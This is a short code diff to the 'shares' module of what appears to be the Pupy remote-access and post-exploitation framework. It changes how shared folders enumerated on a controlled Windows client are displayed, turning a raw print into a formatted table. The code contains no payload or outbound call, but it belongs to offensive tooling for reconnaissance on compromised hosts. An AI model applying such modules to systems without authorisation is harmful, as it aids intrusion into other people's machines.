@@ -1,5 +1,6 @@
 # -*- coding: utf-8 -*-
 
+from pupylib.PupyOutput import Table
 from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
 from netaddr import IPNetwork
 
@@ -47,7 +48,17 @@ class Shares(PupyModule):
         try:
             if args.local:
                 if self.client.is_windows():
-                    print self.client.conn.modules['pupwinutils.drives'].shared_folders()
+                    shared_folders = self.client.remote('pupwinutils.drives', 'shared_folders')
+
+                    folders = shared_folders()
+                    if not folders:
+                        return
+
+                    self.log(Table([{
+                        'Name': share_name,
+                        'Path': share_path
+                    } for share_name, share_path in folders], ['Name', 'Path']))
+
                 else:
                     self.warning('this module works only for windows. Try using: run shares remote -t 127.0.0.1')
                 return
